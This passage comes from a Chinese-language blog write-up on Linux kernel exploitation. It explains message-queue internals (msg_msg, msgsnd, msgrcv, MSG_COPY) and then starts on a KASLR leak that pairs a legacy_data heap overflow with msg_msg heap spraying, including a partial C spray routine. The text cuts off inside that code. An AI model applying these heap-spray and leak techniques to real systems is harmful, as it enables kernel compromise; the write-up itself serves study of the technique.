class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qnum;<span class="hljs-comment">/* 队列中的消息数目 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> q_qbytes;<span class="hljs-comment">/* 队列上最大字节数目 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lspid</span>;</span><span class="hljs-comment">/* 上一次调用msgsnd的pid */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span> *<span class="hljs-title">q_lrpid</span>;</span><span class="hljs-comment">/* 上一次接收消息的pid */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_messages</span>;</span> <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_receivers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">q_senders</span>;</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>除开上面注释的部分，还有三个list_head类型的参数，他们分别用来管理睡眠的发送者(q_senders)、接收者(q_receivers)和消息本身(q_messages)</p><p>而其中我们的q_messages中的各个消息都封装在一个msg_msg当中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span> <span class="hljs-comment">/* 用作与其他msg_msg相链接 */</span><br><span class="hljs-type">long</span> m_type; <span class="hljs-comment">/* 消息类型，用于支持前文所描述的消息队列当中不同的消息类型 */</span><br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* 消息正文长度 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span>  <span class="hljs-comment">/* 如果保存超过一个内存页的长消息，则需要next */</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* 接下来是实际的消息 */</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/* 接下来是实际的消息 */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>msg_msg与user_key_payload相似，都是包含一个固定大小的头结构，剩下的就是消息正文，每个消息都至少分配一个内存页，如下图：</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/71cf3bc79f3df8dc726c63a08b11728b471028aa.jpg"></p><p>基础数据结构讲完，下面我们就来分析一下消息队列中较为重要的几个系统调用</p><h2 id="1-msgsnd"><a href="#1-msgsnd" class="headerlink" title="1.msgsnd"></a>1.msgsnd</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">ksys_msgsnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-keyword">struct</span> msgbuf __user *msgp, <span class="hljs-type">size_t</span> msgsz,</span><br><span class="hljs-params"> <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br><span class="hljs-type">long</span> mtype;<br><br><span class="hljs-keyword">if</span> (get_user(mtype, &amp;msgp-&gt;mtype))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">return</span> do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);<br>&#125;<br><br>SYSCALL_DEFINE4(msgsnd, <span class="hljs-type">int</span>, msqid, <span class="hljs-keyword">struct</span> msgbuf __user *, msgp, <span class="hljs-type">size_t</span>, msgsz,<br><span class="hljs-type">int</span>, msgflg)<br>&#123;<br><span class="hljs-keyword">return</span> ksys_msgsnd(msqid, msgp, msgsz, msgflg);<br>&#125;<br></code></pre></td></tr></table></figure><p>其中的关键函数为<code>do_msgsnd</code>，接下来我们逐步进行分析</p><p>在我们想要发送消息的时候，<code>do_msgsnd</code>会需要为消息创建空间，他调用的这个函数便是load_msg,如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgsnd</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">long</span> mtype, <span class="hljs-type">void</span> __user *mtext,</span><br><span class="hljs-params"><span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-type">int</span> err;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>DEFINE_WAKE_Q(wake_q);<br><br>ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br><span class="hljs-keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="hljs-type">long</span>) msgsz &lt; <span class="hljs-number">0</span> || msqid &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (mtype &lt; <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>msg = load_msg(mtext, msgsz);<br><br>...<br><br></code></pre></td></tr></table></figure><p>而我们load_msg又是会调用alloc_msg来分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">load_msg</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><span class="hljs-type">int</span> err = -EFAULT;<br><span class="hljs-type">size_t</span> alen;<br><br>msg = alloc_msg(len);<br><br>...<br></code></pre></td></tr></table></figure><p>接下来看到alloc_msg函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATALEN_MSG((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATALEN_SEG((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))</span><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">alloc_msg</span><span class="hljs-params">(<span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> **<span class="hljs-title">pseg</span>;</span><br><span class="hljs-type">size_t</span> alen;<br><br>alen = min(len, DATALEN_MSG); <span class="hljs-comment">//从len和PAGE_SIZE-sizeof(struct msg_msg)当中取得较小值</span><br>msg = kmalloc(<span class="hljs-keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (msg == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>msg-&gt;next = <span class="hljs-literal">NULL</span>;<br>msg-&gt;security = <span class="hljs-literal">NULL</span>;<br><br>len -= alen;<br>pseg = &amp;msg-&gt;next;<br><span class="hljs-keyword">while</span> (len &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">//说明是较大的消息，所以需要msg_msgseg字段</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><br>cond_resched();<br><br>alen = min(len, DATALEN_SEG);<br>seg = kmalloc(<span class="hljs-keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (seg == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out_err;<br>*pseg = seg;<br>seg-&gt;next = <span class="hljs-literal">NULL</span>;<br>pseg = &amp;seg-&gt;next;<br>len -= alen;<br>&#125;<br><br><span class="hljs-keyword">return</span> msg;<br><br>out_err:<br>free_msg(msg);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中通过源码大致可以看出，当分配大于PAGE_SIZE的时候，会额外增加msg_msgseg来存储消息正文，其中分配标志为<code>GFP_KERNEL_ACCOUNT</code></p><h2 id="2-msgrcv"><a href="#2-msgrcv" class="headerlink" title="2.msgrcv"></a>2.msgrcv</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">ksys_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-keyword">struct</span> msgbuf __user *msgp, <span class="hljs-type">size_t</span> msgsz,</span><br><span class="hljs-params"> <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg)</span><br>&#123;<br><span class="hljs-keyword">return</span> do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);<br>&#125;<br><br>SYSCALL_DEFINE5(msgrcv, <span class="hljs-type">int</span>, msqid, <span class="hljs-keyword">struct</span> msgbuf __user *, msgp, <span class="hljs-type">size_t</span>, msgsz,<br><span class="hljs-type">long</span>, msgtyp, <span class="hljs-type">int</span>, msgflg)<br>&#123;<br><span class="hljs-keyword">return</span> ksys_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg);<br>&#125;<br></code></pre></td></tr></table></figure><p>同send一样，他同样是调用<code>do_msgrcv</code>来操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br><span class="hljs-type">int</span> mode;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>, *<span class="hljs-title">copy</span> =</span> <span class="hljs-literal">NULL</span>;<br>DEFINE_WAKE_Q(wake_q);<br><br>...<br><br>bufsz = msg_handler(buf, msg, bufsz);<br>free_msg(msg);<br><span class="hljs-keyword">return</span> bufsz;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终调用了msg_handler函数指针，这在最开始是传入了<code> do_msg_fill</code>作为函数指针，所以相当于最终调用了<code>do_msg_fill</code>，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msg_fill</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *dest, <span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">size_t</span> bufsz)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msgbuf</span> __<span class="hljs-title">user</span> *<span class="hljs-title">msgp</span> =</span> dest;<br><span class="hljs-type">size_t</span> msgsz;<br><br><span class="hljs-keyword">if</span> (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;<br><span class="hljs-keyword">if</span> (store_msg(msgp-&gt;mtext, msg, msgsz))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">return</span> msgsz;<br>&#125;<br><br><span class="hljs-comment">/* message buffer for msgsnd and msgrcv calls */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msgbuf</span> &#123;</span><br><span class="hljs-type">__kernel_long_t</span> mtype;          <span class="hljs-comment">/* type of message */</span><br><span class="hljs-type">char</span> mtext[<span class="hljs-number">1</span>];                  <span class="hljs-comment">/* message text */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><p>其中将我们传入的buf，作为<code>msgbuf</code>结构，然后将其中<code>msgp-&gt;mtext</code>作为真正的dest进行拷贝，其中调用<code>strore_msg</code>函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">store_msg</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *dest, <span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br><span class="hljs-type">size_t</span> alen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">seg</span>;</span><br><br>alen = min(len, DATALEN_MSG);<br><span class="hljs-keyword">if</span> (copy_to_user(dest, msg + <span class="hljs-number">1</span>, alen))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-keyword">for</span> (seg = msg-&gt;next; seg != <span class="hljs-literal">NULL</span>; seg = seg-&gt;next) &#123;<br>len -= alen;<br>dest = (<span class="hljs-type">char</span> __user *)dest + alen;<br>alen = min(len, DATALEN_SEG);<br><span class="hljs-keyword">if</span> (copy_to_user(dest, seg + <span class="hljs-number">1</span>, alen))<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在do_msgrcv当中若msgflg带有<code>MSG_COPY</code>，会走到下面这段函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_msgrcv</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz, <span class="hljs-type">long</span> msgtyp, <span class="hljs-type">int</span> msgflg,</span><br><span class="hljs-params">       <span class="hljs-type">long</span> (*msg_handler)(<span class="hljs-type">void</span> __user *, <span class="hljs-keyword">struct</span> msg_msg *, <span class="hljs-type">size_t</span>))</span><br>&#123;<br><span class="hljs-type">int</span> mode;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_queue</span> *<span class="hljs-title">msq</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">msg</span>, *<span class="hljs-title">copy</span> =</span> <span class="hljs-literal">NULL</span>;<br>DEFINE_WAKE_Q(wake_q);<br><br>ns = current-&gt;nsproxy-&gt;ipc_ns;<br><br><span class="hljs-keyword">if</span> (msqid &lt; <span class="hljs-number">0</span> || (<span class="hljs-type">long</span>) bufsz &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br><span class="hljs-keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))<br><span class="hljs-keyword">return</span> -EINVAL;<br>copy = prepare_copy(buf, <span class="hljs-type">min_t</span>(<span class="hljs-type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));<br><span class="hljs-keyword">if</span> (IS_ERR(copy))<br><span class="hljs-keyword">return</span> PTR_ERR(copy);<br>&#125;<br><br>...<br><br></code></pre></td></tr></table></figure><p>其中会调用<code>prepare_copy</code>函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> msg_msg *<span class="hljs-title function_">prepare_copy</span><span class="hljs-params">(<span class="hljs-type">void</span> __user *buf, <span class="hljs-type">size_t</span> bufsz)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> *<span class="hljs-title">copy</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Create dummy message to copy real message to.</span><br><span class="hljs-comment"> */</span><br>copy = load_msg(buf, bufsz);<br><span class="hljs-keyword">if</span> (!IS_ERR(copy))<br>copy-&gt;m_ts = bufsz;<br><span class="hljs-keyword">return</span> copy;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里是拷贝我们的一个预留msg_msg结构体用来存放消息，然后我们回到msgrcv</p><p>由于我们假设本次加上了<code>MSG_COPY</code>标志位，那么接下来会进行到下面这段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;;) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_receiver</span> <span class="hljs-title">msr_d</span>;</span><br><br>...<br><br>msg = find_msg(msq, &amp;msgtyp, mode);<br><br>...<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we are copying, then do not unlink message and do</span><br><span class="hljs-comment"> * not update queue parameters.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (msgflg &amp; MSG_COPY) &#123;<br>msg = copy_msg(msg, copy); <span class="hljs-comment">//复制我们的msg,但并不unlink，这里的返回msg是我们的dst，也就是copy这个参数</span><br><span class="hljs-keyword">goto</span> out_unlock0;<br>&#125;<br><br>...<br><br>&#125;<br><br>...<br><br>out_unlock0:<br>ipc_unlock_object(&amp;msq-&gt;q_perm);<br>wake_up_q(&amp;wake_q);<br>out_unlock1:<br>rcu_read_unlock();<br><span class="hljs-keyword">if</span> (IS_ERR(msg)) &#123;<br>free_copy(copy);<br><span class="hljs-keyword">return</span> PTR_ERR(msg);<br>&#125;<br><br>bufsz = msg_handler(buf, msg, bufsz);<br>free_msg(msg); <span class="hljs-comment">//最后释放copy</span><br><br><span class="hljs-keyword">return</span> bufsz;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该段函数由于咱们传入的<code>MSG_COPY</code>标志位，导致其中我们接受的消息并不会进行下面的列表unlink操作，而是直接复制到临时msg，然后通过msg_handler（也就是do_msg_fill函数）传入给我们的用户区buf，最后释放掉我们刚刚创建的临时msg</p><h1 id="五、漏洞利用"><a href="#五、漏洞利用" class="headerlink" title="五、漏洞利用"></a>五、漏洞利用</h1><h2 id="1-基地址泄露"><a href="#1-基地址泄露" class="headerlink" title="1.基地址泄露"></a>1.基地址泄露</h2><p>首先我们假设其处于真实环境，所以应开的保护基本都需要开启，目前我们先来解决一下KASLR导致的地址随机化问题</p><p>题目中我们需要泄露基地址，我们选用msg_msg搭配seq_operations的手法</p><p>我们现在已知的一个溢出为内核堆上的legacy_data后的溢出，因此我们如何利用legacy_data下一页的内容呢？这时我们可以想到使用堆喷的技巧，在这里我们选则使用msg_msg来进行堆喷，其中是因为他大小可控，且若申请大小大于一页，则会额外申请<code>msg_msgseg</code>结构体来继续存储消息，其二是因为他的分配标志为<code>GFP_KERNEL_COUNT</code>,他刚好同之前我们的fsconfig中申请的fc-&gt;private，也就是legacy_data相一致，如果此处选用<code>GFP_KERNEL</code>的结构体则会存在隔离情况，这个加上COUNT的标志位一般从<code>kmalloc-cg-*</code>来分配，后面不带COUNT的则从<code>kmalloc-*</code>分配</p><p>过程我打算就按照will的wp进行复现，其中的堆喷技巧也值得借鉴</p><p>首先我们要知道大致的堆喷范围，这里我们可以使用命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/proc/</span>slabinfo<br></code></pre></td></tr></table></figure><p>查看一下自己本机的情况大致了解一下，我本机的内核版本是6.2</p><p><img src="http://imgsrc.baidu.com/forum/pic/item/ae51f3deb48f8c54ff34121e7c292df5e0fe7f18.jpg"></p><p>由于我们这个属于大块，在分配的时候也是使用kmalloc_large来分配，所以相应的slab也较大，其中objperslab为8，也就是说同一个slab里面有8个这样的obj,所以我们的堆喷范围大概就是在这个范围左右</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">do_leak</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">uint64_t</span> kernel_base;<br>    <span class="hljs-type">char</span> pat[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;, recieved[<span class="hljs-number">0x2000</span>] = &#123;<span class="hljs-number">0</span>&#125;;      <span class="hljs-comment">//PAGE_SIZE*2</span><br>    <span class="hljs-type">int</span> targets[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    msg* message = (msg* )(buffer); <br>    <span class="hljs-type">int</span> size = <span class="hljs-number">0x1018</span>;      <br>    <span class="hljs-comment">/* msg_msg: (0x30)head, (0xfd0)message_0</span><br><span class="hljs-comment">     * msg_msgseg: (0x8)head, (0x18)message_1, for kmalloc-32 :)</span><br><span class="hljs-comment">     * */</span><br>    <br>    <span class="hljs-comment">/* spray the msg_msg */</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)&#123;<br>        <span class="hljs-built_in">memset</span>(buffer, <span class="hljs-number">0x41</span>+i, <span class="hljs-keyword">sizeof</span>(buffer));<br>        targets[i] = get_msg(IPC_PRIVATE, <span class="hljs-number">0666</span>|IPC_CREAT);<br>        send_msg(targets[i], message, size - <span class="hljs-number">0x30</span>, <span class="hljs-number">0</span>);      <span class="hljs-comment">/* spray the 0x1018 msg_msg from the kmalloc-4k */</span><br>    &#125;<br><br></code></pre></td></tr></table></figure><p>我们首先采取堆喷八个msg_msg，但是这里注意我们的消息长度为(0x1018 - 0x30)，这是为了保证我们可以增添一个额外的msgseg,这样可以，这里由于我们是要搭配后来的<code>seq_operations</code>，因此我们特意构造留给msg_msgseg的大小为0x18,也就是总共加上他的头为0x20，这样可以为我们之后的堆喷打基础:)</p><p>堆喷过后，我们正常利用fsconfig来构造溢出的临界状态，然后再继续进行堆喷，此处的目的是为了更大概率的使得我们溢出到msg_msg的头部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 